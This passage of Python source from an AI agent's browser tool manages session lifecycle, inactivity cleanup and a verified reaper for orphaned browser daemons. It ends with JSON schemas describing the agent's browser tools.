BROWSER_ORPHAN_REAP_INTERVAL = 300  # seconds

# Hard ceiling for a daemon whose owning hermes process is still alive but
# which has fallen out of that process's in-memory session tracking.  The
# owner-alive check alone makes such a daemon immortal: in-memory tracking is
# lost on any exception path, yet the owner PID stays up, so the reaper skips
# it forever.  Idle age (see ``_socket_dir_idle_seconds``) is the escape hatch.
# Deliberately a large multiple of the inactivity timeout so a legitimately
# busy session is never touched.
BROWSER_ORPHAN_GRACE_SECONDS = max(3600, BROWSER_SESSION_INACTIVITY_TIMEOUT * 20)

# Track last activity time per session
_session_last_activity: Dict[str, float] = {}

# Background cleanup thread state
_cleanup_thread = None
_cleanup_running = False
# Protects browser lifecycle, activity, and ownership maps for thread safety.
# (subagents run concurrently via ThreadPoolExecutor)
_cleanup_lock = threading.Lock()

# Bare-task lifecycle and generation fencing. ``_retired_browser_tasks`` stays
# as the compatibility tombstone surface, while these maps model transient
# STARTING/RETIRING states that a set alone cannot represent.
_browser_task_states: Dict[str, BrowserTaskState] = {}
_browser_task_generations: Dict[str, int] = {}
_browser_task_cleanup_reasons: Dict[str, BrowserCleanupReason] = {}
_browser_task_cleanup_locks: Dict[str, Any] = {}

# Page/daemon ownership lives in ``_active_sessions``. Provider-account
# ownership is separate because a provider close can fail after the page and
# local daemon have already been removed.
_pending_provider_cleanups: Dict[
    Tuple[str, int, str], _PendingProviderCleanup
] = {}


class _BrowserSessionRetiredError(RuntimeError):
    """Raised when an implicit session lookup targets a retired browser task."""


def _task_state_locked(bare_task_id: str) -> BrowserTaskState:
    """Read lifecycle state while ``_cleanup_lock`` is held."""
    if bare_task_id in _retired_browser_tasks:
        return BrowserTaskState.RETIRED
    state = _browser_task_states.get(bare_task_id, BrowserTaskState.ACTIVE)
    # The tombstone set remains authoritative for RETIRED so older tests and
    # hot-reload callers that replace/clear it cannot inherit a stale map row.
    if state is BrowserTaskState.RETIRED:
        return BrowserTaskState.ACTIVE
    return state


def _set_task_state_locked(
    bare_task_id: str,
    state: BrowserTaskState,
    *,
    cleanup_reason: Optional[BrowserCleanupReason] = None,
) -> None:
    """Write lifecycle state and keep the compatibility tombstone in sync."""
    _browser_task_states[bare_task_id] = state
    if state is BrowserTaskState.RETIRED:
        _retired_browser_tasks.add(bare_task_id)
    else:
        _retired_browser_tasks.discard(bare_task_id)
    if cleanup_reason is None:
        if state is not BrowserTaskState.RETIRING:
            _browser_task_cleanup_reasons.pop(bare_task_id, None)
    else:
        _browser_task_cleanup_reasons[bare_task_id] = cleanup_reason


def _task_generation_locked(bare_task_id: str) -> int:
    return _browser_task_generations.get(bare_task_id, 0)


def _advance_task_generation_locked(bare_task_id: str) -> int:
    generation = _task_generation_locked(bare_task_id) + 1
    _browser_task_generations[bare_task_id] = generation
    return generation


def _task_has_active_sessions_locked(bare_task_id: str) -> bool:
    return any(
        _bare_task_id_for_session_key(session_key) == bare_task_id
        for session_key in _active_sessions
    )


def _task_cleanup_operation_lock(bare_task_id: str) -> Any:
    """Return the re-entrant per-task lock shared by commands and cleanup."""
    with _cleanup_lock:
        return _browser_task_cleanup_locks.setdefault(
            bare_task_id, threading.RLock()
        )


def _cleanup_reason_retires_task(reason: BrowserCleanupReason) -> bool:
    return reason in {
        BrowserCleanupReason.TERMINAL,
        BrowserCleanupReason.RESTART_ROLLBACK,
    }


def _coerce_cleanup_reason(reason: BrowserCleanupReason | str) -> BrowserCleanupReason:
    if isinstance(reason, BrowserCleanupReason):
        return reason
    return BrowserCleanupReason(str(reason))


def _is_browser_task_unavailable(task_id: str) -> bool:
    bare_task_id = _bare_task_id_for_session_key(task_id or "default")
    with _cleanup_lock:
        return _task_state_locked(bare_task_id) in {
            BrowserTaskState.RETIRING,
            BrowserTaskState.RETIRED,
        }


def _is_task_owned_shared_cdp_session(session_info: Dict[str, Any]) -> bool:
    """Return whether Hermes attached a task-owned tab to an external CDP.

    Cloud providers also expose CDP URLs, but carry a provider session id and
    retain their existing inactivity lifecycle. A fixed/user-supplied CDP
    override has no provider session id: Hermes owns only its pinned target,
    while the shared browser itself is externally owned.
    """
    return bool(session_info.get("cdp_url")) and not session_info.get("bb_session_id")


def _is_browser_task_retired(task_id: str) -> bool:
    bare_task_id = _bare_task_id_for_session_key(task_id or "default")
    with _cleanup_lock:
        return _task_state_locked(bare_task_id) is BrowserTaskState.RETIRED


def _browser_session_retired_result(task_id: str) -> Dict[str, Any]:
    bare_task_id = _bare_task_id_for_session_key(task_id or "default")
    with _cleanup_lock:
        state = _task_state_locked(bare_task_id)
        reason = _browser_task_cleanup_reasons.get(bare_task_id)
    cleanup_pending = state is BrowserTaskState.RETIRING
    terminal = state is BrowserTaskState.RETIRED or (
        cleanup_pending
        and reason is not None
        and _cleanup_reason_retires_task(reason)
    )
    return {
        "success": False,
        "error": (
            "Browser session cleanup is still pending; normal browser commands "
            "are blocked until exact ownership is released."
            if cleanup_pending
            else (
                "Browser session ownership for this task has been retired. "
                "Call browser_navigate to start a fresh owned session."
            )
        ),
        "code": "browser_session_retired",
        "data": {
            "task_id": bare_task_id,
            "state": state.value,
            "terminal": terminal,
            "cleanup_pending": cleanup_pending,
            "cleanup_reason": reason.value if reason is not None else None,
            "recovery": (
                "retry_cleanup"
                if cleanup_pending
                else "browser_navigate"
            ),
        },
    }


def _clear_retired_browser_task_for_navigation(task_id: str) -> bool:
    """Allow an explicit navigation attempt to start a fresh owned session.

    Returns whether the task was retired so a failed attempt can restore the
    terminal boundary after cleaning any partially-created replacement.
    """
    bare_task_id = _bare_task_id_for_session_key(task_id or "default")
    with _cleanup_lock:
        state = _task_state_locked(bare_task_id)
        if state is BrowserTaskState.RETIRING:
            raise _BrowserSessionRetiredError(bare_task_id)
        was_retired = state is BrowserTaskState.RETIRED
        if was_retired:
            _advance_task_generation_locked(bare_task_id)
            _set_task_state_locked(bare_task_id, BrowserTaskState.STARTING)
    if was_retired:
        logger.info(
            "Explicit navigation is restarting retired browser task: %s",
            bare_task_id,
        )
    return was_retired


def _restore_retired_browser_task_after_failed_navigation(
    task_id: str,
    session_key: str,
) -> None:
    """Fail closed when an explicit restart did not complete navigation.

    The rollback enters RETIRING before physical cleanup. If exact cleanup
    fails, ownership remains retryable but every normal command stays blocked;
    successful cleanup transitions to RETIRED.
    """
    cleanup_browser(
        session_key,
        reason=BrowserCleanupReason.RESTART_ROLLBACK,
    )


def _session_expiry_timestamp(session_info: Dict[str, Any]) -> Optional[float]:
    """Return a provider-authoritative session expiry as epoch seconds.

    Cloud providers may omit ``expires_at``. Unknown or malformed values are
    therefore treated as having no known expiry, preserving the existing
    lifecycle for local browsers and providers without an expiry contract.
    """
    value = session_info.get("expires_at")
    if isinstance(value, (int, float)) and not isinstance(value, bool):
        return float(value)
    if not isinstance(value, str) or not value.strip():
        return None

    normalized = value.strip()
    if normalized.endswith(("Z", "z")):
        normalized = f"{normalized[:-1]}+00:00"
    try:
        parsed = datetime.fromisoformat(normalized)
    except ValueError:
        logger.warning("Ignoring invalid cloud browser session expiry timestamp")
        return None
    if parsed.tzinfo is None:
        parsed = parsed.replace(tzinfo=timezone.utc)
    return parsed.timestamp()


def _session_has_expired(
    session_info: Dict[str, Any], *, now: Optional[float] = None
) -> bool:
    """Return whether a cached browser session crossed its provider deadline."""
    expires_at = _session_expiry_timestamp(session_info)
    if expires_at is None:
        return False
    return (time.time() if now is None else now) >= expires_at


def _emergency_cleanup_all_sessions():
    """
    Emergency cleanup of all active browser sessions.
    Called on process exit or interrupt to prevent orphaned sessions.

    Also runs the orphan reaper to clean up daemons left behind by previously
    crashed hermes processes — this way every clean hermes exit sweeps
    accumulated orphans, not just ones that actively used the browser tool.
    """
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True

    # Clean up this process's own sessions first, so their owner_pid files
    # are removed before the reaper scans.
    if _active_sessions or _pending_provider_cleanups:
        logger.info(
            "Emergency cleanup: closing %s active/pending browser ownership(s)...",
            len(_active_sessions) + len(_pending_provider_cleanups),
        )
        try:
            cleanup_all_browsers()
        except Exception as e:
            logger.error("Emergency cleanup error: %s", e)
        finally:
            with _cleanup_lock:
                _active_sessions.clear()
                _session_last_activity.clear()
                _recording_sessions.clear()

    # Sweep orphans from other crashed hermes processes.  Safe even if we
    # never used the browser — uses owner_pid liveness to avoid reaping
    # daemons owned by other live hermes processes.
    try:
        _reap_orphaned_browser_sessions()
    except Exception as e:
        logger.debug("Orphan reap on exit failed: %s", e)


# Register cleanup via atexit only.  Previous versions installed SIGINT/SIGTERM
# handlers that called sys.exit(), but this conflicts with prompt_toolkit's
# async event loop — a SystemExit raised inside a key-binding callback
# corrupts the coroutine state and makes the process unkillable.  atexit
# handlers run on any normal exit (including sys.exit), so browser sessions
# are still cleaned up without hijacking signals.
atexit.register(_emergency_cleanup_all_sessions)


# =============================================================================
# Inactivity Cleanup Functions
# =============================================================================

def _cleanup_inactive_browser_sessions():
    """
    Clean up browser sessions that have been inactive for longer than the timeout.

    This function is called periodically by the background cleanup thread to
    automatically close sessions that haven't been used recently, preventing
    orphaned sessions (local or Browserbase) from accumulating.
    """
    current_time = time.time()
    sessions_to_cleanup = []

    with _cleanup_lock:
        for task_id, last_time in list(_session_last_activity.items()):
            session_info = _active_sessions.get(task_id)
            # Fixed/external CDP sessions own an exact target in a shared
            # browser. Browser-command silence does not mean the overall agent
            # turn is idle (the model may be waiting on the page), so the
            # normal end-of-turn cleanup owns their lifecycle. Local and cloud
            # sessions keep the ordinary inactivity policy below.
            if (
                session_info
                and _is_task_owned_shared_cdp_session(session_info)
                and not session_info.get("_cleanup_retry_pending")
            ):
                continue
            if current_time - last_time > BROWSER_SESSION_INACTIVITY_TIMEOUT:
                sessions_to_cleanup.append(task_id)

    for task_id in sessions_to_cleanup:
        try:
            elapsed = int(current_time - _session_last_activity.get(task_id, current_time))
            logger.info("Cleaning up inactive session for task: %s (inactive for %ss)", task_id, elapsed)
            if cleanup_browser(
                task_id,
                reason=BrowserCleanupReason.INACTIVITY,
            ):
                with _cleanup_lock:
                    _session_last_activity.pop(task_id, None)
            else:
                # Keep ownership retryable without hammering the same failed
                # close on every cleanup-loop tick.
                with _cleanup_lock:
                    if task_id in _session_last_activity:
                        _session_last_activity[task_id] = current_time
        except Exception as e:
            logger.warning("Error cleaning up inactive session %s: %s", task_id, e)


def _write_owner_pid(socket_dir: str, session_name: str) -> None:
    """Record the current hermes PID as the owner of a browser socket dir.

    Written atomically to ``<socket_dir>/<session_name>.owner_pid`` so the
    orphan reaper can distinguish daemons owned by a live hermes process
    (don't reap) from daemons whose owner crashed (reap).  Best-effort —
    an OSError here just falls back to the legacy ``tracked_names``
    heuristic in the reaper.
    """
    try:
        path = os.path.join(socket_dir, f"{session_name}.owner_pid")
        with open(path, "w", encoding="utf-8") as f:
            f.write(str(os.getpid()))
    except OSError as exc:
        logger.debug("Could not write owner_pid file for %s: %s",
                     session_name, exc)


def _write_shared_cdp_endpoint(
    socket_dir: str,
    session_name: str,
    cdp_url: str,
) -> None:
    """Persist the browser-level endpoint needed for exact orphan cleanup.

    The endpoint may contain authentication material, so the file is created
    with mode 0600 inside the already private per-session socket directory.
    Failure is safe: the orphan reaper will preserve the daemon and target
    metadata rather than falling back to ambiguous tab discovery.
    """
    cdp_url = str(cdp_url or "").strip()
    if not cdp_url:
        return
    path = os.path.join(socket_dir, f"{session_name}.cdp_endpoint")
    try:
        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "w", encoding="utf-8") as handle:
            handle.write(cdp_url)
        os.chmod(path, 0o600)
    except OSError as exc:
        logger.debug("Could not persist shared-CDP endpoint for %s: %s", session_name, exc)


def _verify_reapable_browser_daemon(daemon_pid: int, socket_dir: str,
                                    session_name: str) -> bool:
    """Confirm a live PID is genuinely *this* session's agent-browser daemon.

    The orphan reaper scans world-writable, predictably-named temp paths
    (``/tmp/agent-browser-h_*`` etc.) and reads a daemon PID from a ``.pid``
    file we do not write ourselves — the agent-browser daemon writes it.  A
    same-user actor can therefore plant a fake socket dir whose ``.pid`` points
    at an arbitrary victim process, or a recycled PID can land on an unrelated
    process after the real daemon exits.  Either way, terminating that PID
    (a *tree* kill via ``_terminate_host_pid``) is an arbitrary-process DoS.

    Before reaping we require, via ``psutil`` (a hard dependency, cross-platform
    for same-user processes — the only processes the reaper can signal):

      1. **Identity** — the process looks like agent-browser: ``agent-browser``
         appears in its name or command line.
      2. **Binding** — the process is bound to *this* session's socket dir: the
         socket dir path (or its basename) appears in the command line, or in
         ``AGENT_BROWSER_SOCKET_DIR`` in the process environment.

    Requirement (2) is the real spoof defense: a planted process pointing at a
    victim PID will not have the victim's cmdline/environ referencing our
    socket dir.  An attacker would need a process that genuinely embeds this
    exact session path — i.e. a real daemon they already own and could signal
    directly.  Fail-closed: any ambiguity (unreadable cmdline, no match) means
    we refuse to reap and leave the process and its socket dir alone.

    Returns ``True`` only when both checks pass.
    """
    try:
        import psutil
    except ImportError:  # psutil is a hard dep; defensive only
        logger.warning(
            "Refusing to reap browser daemon PID %d (session %s): "
            "psutil unavailable for identity verification",
            daemon_pid, session_name)
        return False

    try:
        proc = psutil.Process(daemon_pid)
        name = (proc.name() or "").lower()
        cmdline = " ".join(proc.cmdline() or []).lower()
    except psutil.NoSuchProcess:
        # Vanished between the liveness check and now — nothing to reap.
        return False
    except (psutil.AccessDenied, OSError) as exc:
        logger.warning(
            "Refusing to reap browser daemon PID %d (session %s): "
            "could not read process identity (%s)",
            daemon_pid, session_name, exc)
        return False

    looks_like_browser = "agent-browser" in name or "agent-browser" in cmdline
    if not looks_like_browser:
        logger.warning(
            "Refusing to reap PID %d (session %s): not an agent-browser "
            "process (name=%r)", daemon_pid, session_name, name)
        return False

    # Binding check: the live process must reference *this* socket dir.
    socket_dir_l = socket_dir.lower()
    socket_base_l = os.path.basename(socket_dir).lower()
    bound = socket_dir_l in cmdline or (
        socket_base_l and socket_base_l in cmdline)
    if not bound:
        try:
            env_dir = (proc.environ() or {}).get(
                "AGENT_BROWSER_SOCKET_DIR", "")
            bound = bool(env_dir) and os.path.normpath(env_dir) == \
                os.path.normpath(socket_dir)
        except (psutil.AccessDenied, psutil.NoSuchProcess, OSError):
            # environ() can be denied even same-user on some platforms.
            # cmdline already failed to bind — fail closed.
            bound = False

    if not bound:
        logger.warning(
            "Refusing to reap agent-browser PID %d: not bound to session "
            "socket dir %s (possible recycled PID or planted pid file)",
            daemon_pid, socket_dir)
        return False

    return True


def _socket_dir_idle_seconds(socket_dir: str) -> Optional[float]:
    """Seconds since anything in ``socket_dir`` was last written.

    Every browser command writes ``_stdout_<cmd>`` / ``_stderr_<cmd>`` temp
    files into the session's socket dir, so the newest mtime under that dir is
    a last-activity marker that — unlike ``_session_last_activity`` — survives
    hermes restarts and does not depend on in-memory bookkeeping surviving an
    exception path.

    The directory's own mtime is not sufficient: command names repeat, so
    rewriting an existing ``_stdout_click`` updates that file's mtime but not
    the directory's.  Scan the entries too.

    Returns ``None`` when the age cannot be determined, so callers can fail
    safe (treat unknown age as "too young to reap").
    """
    try:
        latest = os.path.getmtime(socket_dir)
    except OSError:
        return None

    try:
        with os.scandir(socket_dir) as entries:
            for entry in entries:
                try:
                    latest = max(latest, entry.stat().st_mtime)
                except OSError:
                    continue
    except OSError:
        pass  # dir mtime alone is still a usable lower bound

    return max(0.0, time.time() - latest)


def _orphan_target_ownership(
    socket_dir: str,
    session_name: str,
) -> OrphanTargetOwnership:
    """Classify exact target ownership without guessing from broken metadata.

    ``cdp_*`` names are task-owned shared-CDP sessions. Missing, unreadable,
    malformed, or wrong-shaped metadata for those sessions is UNKNOWN: deleting
    the directory or daemon would erase the last place exact ownership may be
    recovered. Legacy local/provider sessions are confirmed unpinned when they
    have no target record.
    """
    target_file = Path(socket_dir) / f"{session_name}.target"
    if not target_file.exists():
        if session_name.startswith("cdp_"):
            return OrphanTargetOwnership.UNKNOWN
        return OrphanTargetOwnership.CONFIRMED_UNPINNED
    try:
        payload = json.loads(target_file.read_text(encoding="utf-8"))
    except (OSError, ValueError, TypeError):
        return OrphanTargetOwnership.UNKNOWN
    if not isinstance(payload, dict):
        return OrphanTargetOwnership.UNKNOWN
    target_id = payload.get("targetId")
    if payload.get("pinned") is True and isinstance(target_id, str) and target_id:
        return OrphanTargetOwnership.PINNED
    if payload.get("pinned") is False:
        return OrphanTargetOwnership.CONFIRMED_UNPINNED
    return OrphanTargetOwnership.UNKNOWN


def _orphan_has_pinned_target(socket_dir: str, session_name: str) -> bool:
    """Compatibility wrapper; the reaper itself uses tri-state ownership."""
    return (
        _orphan_target_ownership(socket_dir, session_name)
        is OrphanTargetOwnership.PINNED
    )


def _close_orphaned_pinned_target(socket_dir: str, session_name: str) -> bool:
    """Close an orphan's recorded target through its persisted CDP endpoint.

    No target discovery is performed. If the exact close cannot be confirmed,
    return False so the caller preserves both daemon and ownership metadata for
    a later retry instead of converting a sensitive page leak into an
    untracked one. There is deliberately no age-based daemon-kill fallback:
    the target belongs to an external shared browser, so killing its helper
    daemon cannot close the page and would destroy the last automatic
    exact-close path.
    """
    try:
        target_payload = json.loads(
            (Path(socket_dir) / f"{session_name}.target").read_text(encoding="utf-8")
        )
        target_id = target_payload.get("targetId") if isinstance(target_payload, dict) else None
        cdp_url = (
            Path(socket_dir) / f"{session_name}.cdp_endpoint"
        ).read_text(encoding="utf-8").strip()
    except (OSError, ValueError, TypeError):
        return False
    if not isinstance(target_id, str) or not target_id.strip() or not cdp_url:
        return False
    return _close_shared_cdp_target_confirmed(cdp_url, target_id.strip())


def _reap_orphaned_browser_sessions():
    """Scan for orphaned agent-browser daemon processes from previous runs.

    When the Python process that created a browser session exits uncleanly
    (SIGKILL, crash, gateway restart), the in-memory ``_active_sessions``
    tracking is lost but the node + Chromium processes keep running.

    This function scans the tmp directory for ``agent-browser-*`` socket dirs
    left behind by previous runs, reads the daemon PID files, and kills any
    daemons whose owning hermes process is no longer alive.

    Ownership detection priority:
      1. ``<session>.owner_pid`` file (written by current code) — if the
         referenced hermes PID is alive, leave the daemon alone regardless
         of whether it's in *this* process's ``_active_sessions``.  This is
         cross-process safe: two concurrent hermes instances won't reap each
         other's daemons.
      2. Fallback for daemons that predate owner_pid: check
         ``_active_sessions`` in the current process.  If not tracked here,
         treat as orphan (legacy behavior).

    Safe to call from any context — atexit, cleanup thread, or on demand.
    """
    import glob

    tmpdir = _socket_safe_tmpdir()
    pattern = os.path.join(tmpdir, "agent-browser-h_*")
    socket_dirs = glob.glob(pattern)
    # Also pick up CDP sessions
    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-cdp_*"))
    # Also pick up cloud-provider sessions (browser-use/browserbase/firecrawl)
    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-hermes_*"))

    if not socket_dirs:
        return

    # Build set of session_names currently tracked by this process (fallback path)
    with _cleanup_lock:
        tracked_names = {
            info.get("session_name")
            for info in _active_sessions.values()
            if info.get("session_name")
        }

    reaped = 0
    for socket_dir in socket_dirs:
        dir_name = os.path.basename(socket_dir)
        # dir_name is "agent-browser-{session_name}"
        session_name = dir_name.removeprefix("agent-browser-")
        if not session_name:
            continue

        # Ownership check: prefer owner_pid file (cross-process safe).
        owner_pid_file = os.path.join(socket_dir, f"{session_name}.owner_pid")
        owner_pid: Optional[int] = None
        owner_alive: Optional[bool] = None  # None = owner_pid missing/unreadable
        if os.path.isfile(owner_pid_file):
            try:
                owner_pid = int(Path(owner_pid_file).read_text(encoding="utf-8").strip())
                # ``os.kill(pid, 0)`` is NOT a no-op on Windows (bpo-14484).
                # Use the cross-platform existence check.
                from gateway.status import _pid_exists
                owner_alive = _pid_exists(owner_pid)
            except (ValueError, OSError):
                owner_pid = None
                owner_alive = None  # corrupt file — fall through

        if owner_alive is True:
            # Owner is alive.  Normally that means the session belongs to a
            # live hermes process and must not be touched — but "owner alive"
            # alone made leaked daemons immortal: if the owner lost its
            # in-memory tracking (any exception path between spawn and
            # registration), nothing would ever reap the daemon, and the
            # daemon-side AGENT_BROWSER_IDLE_TIMEOUT_MS does not fire when the
            # daemon itself is wedged (e.g. Chrome's framework was swapped out
            # from under it by an auto-update).
            #
            # So: still trust live tracking, but fall back to idle age.
            if session_name in tracked_names:
                continue

            idle_s = _socket_dir_idle_seconds(socket_dir)
            if idle_s is None or idle_s < BROWSER_ORPHAN_GRACE_SECONDS:
                # Unknown age, or still within the grace window — fail safe.
                continue

            logger.warning(
                "Browser session %s has a live owner (PID %s) but is untracked "
                "and idle for %ds (grace %ds) — treating as leaked and reaping",
                session_name, owner_pid, int(idle_s),
                BROWSER_ORPHAN_GRACE_SECONDS)
            # fall through to the reap path below

        if owner_alive is None:
            # No owner_pid file (legacy daemon).  Fall back to in-process
            # tracking: if this process knows about the session, leave alone.
            if session_name in tracked_names:
                continue

        # owner_alive is False (dead owner) OR legacy daemon not tracked here.
        target_ownership = _orphan_target_ownership(socket_dir, session_name)
        if target_ownership is OrphanTargetOwnership.UNKNOWN:
            logger.warning(
                "Orphaned shared-CDP target metadata for session %s is missing "
                "or unreadable; retaining daemon and ownership directory",
                session_name,
            )
            continue
        pinned_target_owned = target_ownership is OrphanTargetOwnership.PINNED
        if pinned_target_owned and not _close_orphaned_pinned_target(
            socket_dir, session_name
        ):
            logger.warning(
                "Could not confirm exact pinned target close for orphaned session %s; "
                "retaining daemon and ownership metadata for retry",
                session_name,
            )
            continue

        pid_file = os.path.join(socket_dir, f"{session_name}.pid")
        if not os.path.isfile(pid_file):
            # Exact target ownership is either absent or already released.
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        try:
            daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
        except (ValueError, OSError):
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        # Check if the daemon is still alive. ``os.kill(pid, 0)`` on Windows
        # is NOT a no-op — use the handle-based existence check.
        from gateway.status import _pid_exists
        if not _pid_exists(daemon_pid):
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        # The PID is live — but the .pid file lives in a world-writable,
        # predictably-named temp dir we don't write ourselves, and PIDs get
        # recycled after the real daemon exits.  Verify the process really is
        # *this* session's agent-browser daemon before tree-killing it; refuse
        # otherwise (don't touch the process, leave the socket dir for a later
        # sweep once the imposter PID is gone).  Fixes the arbitrary same-user
        # process DoS in issue #14073.
        if not _verify_reapable_browser_daemon(
                daemon_pid, socket_dir, session_name):
            continue

        # Daemon is alive and its owner is dead (or legacy + untracked).  Reap.
        # Use the process-tree termination helper so Chromium children
        # (renderer, GPU, etc.) are cleaned up, not just the daemon parent.
        try:
            from tools.process_registry import ProcessRegistry
            ProcessRegistry._terminate_host_pid(daemon_pid)
            logger.info("Reaped orphaned browser daemon PID %d (session %s)",
                        daemon_pid, session_name)
            reaped += 1
        except (ProcessLookupError, PermissionError, OSError):
            pass

        # Clean up the socket directory
        shutil.rmtree(socket_dir, ignore_errors=True)

    if reaped:
        logger.info("Reaped %d orphaned browser session(s) from previous run(s)", reaped)


def _browser_cleanup_thread_worker():
    """
    Background thread that periodically cleans up inactive browser sessions.

    Runs every 30 seconds and checks for sessions that haven't been used
    within the BROWSER_SESSION_INACTIVITY_TIMEOUT period.

    Also reaps orphaned daemons — on startup (sessions left by previous
    process lifetimes) *and* every BROWSER_ORPHAN_REAP_INTERVAL seconds
    thereafter.  The periodic pass matters because a leak is not only a
    across-restart phenomenon: a daemon can fall out of in-memory tracking
    at any point in a long-lived process, and a startup-only reap can never
    recover from that.
    """
    reap_every_cycles = max(1, round(BROWSER_ORPHAN_REAP_INTERVAL / 30))
    cycle = 0

    while _cleanup_running:
        # cycle 0 is the startup reap; then every reap_every_cycles.
        if cycle % reap_every_cycles == 0:
            try:
                _reap_orphaned_browser_sessions()
            except Exception as e:
                logger.warning("Orphan reap error: %s", e)
        cycle += 1

        try:
            _cleanup_inactive_browser_sessions()
        except Exception as e:
            logger.warning("Cleanup thread error: %s", e)

        # Sleep in 1-second intervals so we can stop quickly if needed
        for _ in range(30):
            if not _cleanup_running:
                break
            time.sleep(1)


def _start_browser_cleanup_thread():
    """Start the background cleanup thread if not already running."""
    global _cleanup_thread, _cleanup_running

    with _cleanup_lock:
        if _cleanup_thread is None or not _cleanup_thread.is_alive():
            _cleanup_running = True
            _cleanup_thread = threading.Thread(
                target=_browser_cleanup_thread_worker,
                daemon=True,
                name="browser-cleanup"
            )
            _cleanup_thread.start()
            logger.info("Started inactivity cleanup thread (timeout: %ss)", BROWSER_SESSION_INACTIVITY_TIMEOUT)


def _stop_browser_cleanup_thread():
    """Stop the background cleanup thread."""
    global _cleanup_running
    _cleanup_running = False
    if _cleanup_thread is not None:
        _cleanup_thread.join(timeout=5)


def _update_session_activity(task_id: str):
    """Update the last activity timestamp for a session."""
    with _cleanup_lock:
        _session_last_activity[task_id] = time.time()


# Register cleanup thread stop on exit
atexit.register(_stop_browser_cleanup_thread)


# ============================================================================
# Tool Schemas
# ============================================================================

BROWSER_TOOL_SCHEMAS = [
    {
        "name": "browser_navigate",
        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). For plain-text endpoints — URLs ending in .md, .txt, .json, .yaml, .yml, .csv, .xml, raw.githubusercontent.com, or any documented API endpoint — prefer curl via the terminal tool or web_extract; the browser stack is overkill and much slower for these. Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "The URL to navigate to (e.g., 'https://example.com')"
                }
            },
            "required": ["url"]
        }
    },
    {
        "name": "browser_snapshot",
        "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 15000 chars are truncated or LLM-summarized; when that happens the complete snapshot is saved to a file and the output includes its path so you can page through the rest with read_file. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot — use this to refresh after interactions that change the page, or with full=true for complete content.",
        "parameters": {
            "type": "object",
            "properties": {
                "full": {
                    "type": "boolean",
                    "description": "If true, returns complete page content. If false (default), returns compact view with interactive elements only.",
                    "default": False
                }
            },
            "required": []
        }
    },
    {
        "name": "browser_click",
        "description": "Click on an element identified by its ref ID from the snapshot (e.g., '@e5'). The ref IDs are shown in square brackets in the snapshot output. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"
                }
            },
            "required": ["ref"]
        }
    },
    {
        "name": "browser_type",
        "description": "Type text into an input field identified by its ref ID. Clears the field first, then types the new text. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e3')"
                },
                "text": {
                    "type": "string",
                    "description": "The text to type into the field"
                }
            },
            "required": ["ref", "text"]
        }
    },
    {
        "name": "browser_scroll",
        "description": "Scroll the page in a direction. Use this to reveal more content that may be below or above the current viewport. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "direction": {
                    "type": "string",
                    "enum": ["up", "down"],
                    "description": "Direction to scroll"
                }
            },
            "required": ["direction"]
        }
    },
    {
        "name": "browser_back",
        "description": "Navigate back to the previous page in browser history. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_press",
        "description": "Press a keyboard key. Useful for submitting forms (Enter), navigating (Tab), or keyboard shortcuts. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "key": {
                    "type": "string",
                    "description": "Key to press (e.g., 'Enter', 'Tab', 'Escape', 'ArrowDown')"
                }
            },
            "required": ["key"]
        }
    },
    {
        "name": "browser_get_images",
        "description": "Get a list of all images on the current page with their URLs and alt text. Useful for finding images to analyze with the vision tool. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_vision",
        "description": "Take a screenshot of the current page so you can inspect it visually. Use this when you need to understand what the page looks like - especially for CAPTCHAs, visual verification challenges, complex layouts, or cases where the text snapshot misses important visual information. When your active model has native vision, the screenshot is attached to your context directly and you inspect it on the next turn; otherwise Hermes falls back to an auxiliary vision model and returns a text analysis. Includes a screenshot_path that you can share with the user by including MEDIA:<screenshot_path> in your response. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "question": {
                    "type": "string",
                    "description": "What you want to know about the page visually. Be specific about what you're looking for."
                },
                "annotate": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, overlay numbered [N] labels on interactive elements. Each [N] maps to ref @eN for subsequent browser commands. Useful for QA and spatial reasoning about page layout."
                }
            },
            "required": ["question"]
        }
    },
    {
        "name": "browser_console",
        "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first. When 'expression' is provided, evaluates JavaScript in the page context and returns the result — use this for DOM inspection, reading page state, or extracting data programmatically.",
        "parameters": {
            "type": "object",
            "properties": {
                "clear": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, clear the message buffers after reading"
                },
                "expression": {
                    "type": "string",
                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'"
                }
            },
            "required": []
        }
    },
]


# ============================================================================
# Utility Functions
